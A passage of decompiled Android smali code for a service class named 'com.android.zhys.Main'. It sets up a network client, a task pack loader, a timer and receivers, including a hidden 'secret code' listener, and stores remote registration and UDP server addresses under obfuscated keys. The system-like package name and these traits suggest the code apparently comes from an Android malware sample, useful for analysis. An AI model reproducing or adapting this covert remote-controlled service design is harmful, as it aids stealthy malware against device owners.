    invoke-interface {v3, p0}, Lcom/ck/services/modules/INetClient;->onCreate(Lcom/ck/services/statistics/IStatistics;)V

    .line 135
    new-instance v3, Lcom/ck/services/modules/MainConfig;

    invoke-direct {v3}, Lcom/ck/services/modules/MainConfig;-><init>()V

    iput-object v3, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    .line 136
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    invoke-interface {v3, p0}, Lcom/ck/services/modules/IMainConfig;->onCreate(Lcom/ck/services/statistics/IStatistics;)V

    .line 138
    new-instance v3, Lcom/ck/services/task/TaskPackLoader;

    invoke-direct {v3}, Lcom/ck/services/task/TaskPackLoader;-><init>()V

    iput-object v3, p0, Lcom/android/zhys/Main;->mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

    .line 139
    iget-object v3, p0, Lcom/android/zhys/Main;->mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

    invoke-virtual {v3, p0}, Lcom/ck/services/task/TaskPackLoader;->onCreate(Lcom/ck/services/statistics/IStatistics;)V

    .line 141
    const/4 v3, 0x5

    invoke-static {v3}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;

    move-result-object v3

    iput-object v3, p0, Lcom/android/zhys/Main;->mMainExecutorPool:Ljava/util/concurrent/ExecutorService;

    .line 143
    invoke-direct {p0}, Lcom/android/zhys/Main;->buildShellInfo()V

    .line 145
    iget-object v3, p0, Lcom/android/zhys/Main;->mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

    invoke-virtual {v3}, Lcom/android/zhys/Main$Pacemaker;->start()V

    .line 146
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 151
    :try_start_0
    iget-object v0, p0, Lcom/android/zhys/Main;->mPacemakerBCReceiver:Lcom/android/zhys/Main$PacemakerBCReceiver;

    if-eqz v0, :cond_0

    .line 152
    iget-object v0, p0, Lcom/android/zhys/Main;->mPacemakerBCReceiver:Lcom/android/zhys/Main$PacemakerBCReceiver;

    invoke-virtual {p0, v0}, Lcom/android/zhys/Main;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 155
    :cond_0
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

    if-eqz v0, :cond_1

    .line 156
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

    invoke-virtual {v0}, Lcom/android/zhys/Main$Pacemaker;->cancel()V

    .line 159
    :cond_1
    iget-object v0, p0, Lcom/android/zhys/Main;->mPackageBCReceiver:Lcom/android/zhys/Main$PackageBCReceiver;

    if-eqz v0, :cond_2

    .line 160
    iget-object v0, p0, Lcom/android/zhys/Main;->mPackageBCReceiver:Lcom/android/zhys/Main$PackageBCReceiver;

    invoke-virtual {p0, v0}, Lcom/android/zhys/Main;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 162
    :cond_2
    iget-object v0, p0, Lcom/android/zhys/Main;->mSecretCodeListner:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/android/zhys/Main;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 167
    :goto_0
    iget-object v0, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    invoke-interface {v0}, Lcom/ck/services/statistics/IDynMain;->onDestroy()V

    .line 168
    :cond_3
    iget-object v0, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

    invoke-interface {v0}, Lcom/ck/services/modules/INetClient;->onDestroy()V

    .line 169
    :cond_4
    iget-object v0, p0, Lcom/android/zhys/Main;->mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

    if-eqz v0, :cond_5

    iget-object v0, p0, Lcom/android/zhys/Main;->mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

    invoke-virtual {v0}, Lcom/ck/services/task/TaskPackLoader;->onDestroy()V

    .line 171
    :cond_5
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainExecutorPool:Ljava/util/concurrent/ExecutorService;

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcom/android/zhys/Main;->mMainExecutorPool:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 173
    :cond_6
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 174
    return-void

    .line 163
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 198
    const/4 v0, 0x1

    return v0
.end method

.method public sendEmptyMessage(I)V
    .locals 1
    .param p1, "what"    # I

    .prologue
    .line 341
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainHandler:Landroid/os/Handler;

    invoke-virtual {v0, p1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 342
    return-void
.end method

.method public sendMessage(Landroid/os/Message;)V
    .locals 1
    .param p1, "msg"    # Landroid/os/Message;

    .prologue
    .line 346
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainHandler:Landroid/os/Handler;

    invoke-virtual {v0, p1}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    .line 347
    return-void
.end method

.method public sendMessageDelayed(Landroid/os/Message;J)V
    .locals 2
    .param p1, "msg"    # Landroid/os/Message;
    .param p2, "delayTime"    # J

    .prologue
    .line 351
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainHandler:Landroid/os/Handler;

    invoke-virtual {v0, p1, p2, p3}, Landroid/os/Handler;->sendMessageDelayed(Landroid/os/Message;J)Z

    .line 352
    return-void
.end method

.method public setRegServer(Ljava/lang/String;I)V
    .locals 2
    .param p1, "ip"    # Ljava/lang/String;
    .param p2, "port"    # I

    .prologue
    .line 393
    iget-object v0, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v1, "f3c744d950bf70dfc8c7cbcae23f26fa"

    invoke-interface {v0, v1, p1}, Lcom/ck/services/modules/IMainConfig;->setValue(Ljava/lang/String;Ljava/lang/String;)V

    .line 394
    iget-object v0, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v1, "a093e159930c7b744f1a84171889b044"

    invoke-interface {v0, v1, p2}, Lcom/ck/services/modules/IMainConfig;->setValue(Ljava/lang/String;I)V

    .line 395
    return-void
.end method

.method public setUdpServer(Lcom/ck/services/statistics/IStatistics$UdpServer;)V
    .locals 4
    .param p1, "server"    # Lcom/ck/services/statistics/IStatistics$UdpServer;

    .prologue
    .line 372
    :try_start_0
    iget-object v1, p1, Lcom/ck/services/statistics/IStatistics$UdpServer;->mIP:Ljava/lang/String;

    invoke-static {v1}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    .line 373
    iget-object v1, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v2, "2f735cc2a65622296859b7bacce72a68"

    iget-object v3, p1, Lcom/ck/services/statistics/IStatistics$UdpServer;->mIP:Ljava/lang/String;

    invoke-interface {v1, v2, v3}, Lcom/ck/services/modules/IMainConfig;->setValue(Ljava/lang/String;Ljava/lang/String;)V

    .line 374
    iget-object v1, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v2, "5507b177feeae534e7517519ed64999b"

    iget v3, p1, Lcom/ck/services/statistics/IStatistics$UdpServer;->mMinPort:I

    invoke-interface {v1, v2, v3}, Lcom/ck/services/modules/IMainConfig;->setValue(Ljava/lang/String;I)V

    .line 375
    iget-object v1, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v2, "bef42c377df6e66c43c0bf2e02eb08c6"

    iget v3, p1, Lcom/ck/services/statistics/IStatistics$UdpServer;->mMaxPort:I

    invoke-interface {v1, v2, v3}, Lcom/ck/services/modules/IMainConfig;->setValue(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 382
    :goto_0
    return-void

    .line 376
    :catch_0
    move-exception v0

    .line 378
    .local v0, "e":Ljava/net/UnknownHostException;
    invoke-virtual {v0}, Ljava/net/UnknownHostException;->printStackTrace()V

    goto :goto_0

    .line 379
    .end local v0    # "e":Ljava/net/UnknownHostException;
    :catch_1
    move-exception v0

    .line 380
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public submitTask(Ljava/lang/Runnable;)V
    .locals 2
    .param p1, "runable"    # Ljava/lang/Runnable;

    .prologue
    .line 331
    :try_start_0
    iget-object v1, p0, Lcom/android/zhys/Main;->mMainExecutorPool:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v1, p1}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/util/concurrent/RejectedExecutionException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_1

    .line 337
    :goto_0
    return-void

    .line 332
    :catch_0
    move-exception v0

    .line 333
    .local v0, "e":Ljava/util/concurrent/RejectedExecutionException;
    invoke-virtual {v0}, Ljava/util/concurrent/RejectedExecutionException;->printStackTrace()V

    goto :goto_0

    .line 334
    .end local v0    # "e":Ljava/util/concurrent/RejectedExecutionException;
    :catch_1
    move-exception v0

    .line 335
    .local v0, "e":Ljava/lang/NullPointerException;
    invoke-virtual {v0}, Ljava/lang/NullPointerException;->printStackTrace()V

    goto :goto_0
.end method
